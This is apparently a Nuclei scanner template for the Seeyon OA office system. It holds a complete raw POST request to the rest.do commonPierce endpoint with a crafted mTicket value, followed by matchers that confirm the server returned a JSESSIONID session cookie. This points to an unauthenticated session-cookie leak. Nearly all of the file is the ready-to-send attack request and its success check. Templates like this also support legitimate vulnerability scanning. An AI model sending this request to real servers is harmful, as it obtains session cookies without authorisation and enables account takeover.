id: seeyon-oa-rest-getCookie

info:
  name: seeyonOA-rest-getCookie
  author: seeyonOA
  severity: high
  tags: seeyon,oa,info-leak,post

http:
  - raw:
      - |
        POST /seeyon/uc/rest.do?method=commonPierce HTTP/1.1
        Host: {{Hostname}}
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
        Connection: keep-alive
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 84

        pierceType=pierceTask&from=1&subject=1&talkId=1&mTicket=LjgzODQxNDMxMjQzNDU4NTkyNzk=
    
    # 修复DSL匹配规则（移除lowercase函数，兼容所有Nuclei版本）
    matchers:
      - type: dsl
        dsl:
          - "status_code == 200"
          - "contains(body, '/seeyon/taskmanage/taskinfo.do')"
          - "contains(header, 'Set-Cookie: JSESSIONID')"
        condition: and